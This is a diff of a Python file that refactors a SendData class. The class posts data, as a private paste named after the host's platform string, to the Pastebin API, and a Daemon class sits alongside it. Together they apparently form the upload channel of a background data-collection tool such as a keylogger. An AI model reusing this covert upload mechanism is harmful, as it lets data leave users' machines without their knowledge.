@@ -21,7 +21,8 @@ class Daemon:
 
 class SendData(object):
     def __init__(self):
-        self.api         = 'Your api dev key in ==> https://pastebin.com/api' # <==== edite here
+        self.api_dev     = 'Your api dev key in ==> https://pastebin.com/api' # <==== edite here
+        self.api_user    = 'Your api user key' # <==== edite here
         self.PastebinAPI = 'https://pastebin.com/api/api_post.php'
 
     
@@ -37,9 +38,9 @@ class SendData(object):
             
             Infromation_Past = {
                 'api_option': 'paste',
-                'api_dev_key': self.api,
+                'api_dev_key': self.api_dev,
                 'api_paste_code': data,
-                'api_user_key': 'Your api user key', # <==== edite here
+                'api_user_key': self.api_user,
                 'api_paste_name': implementation._multiarch,
                 'api_paste_format': 'text',
                 'api_paste_private': 2,
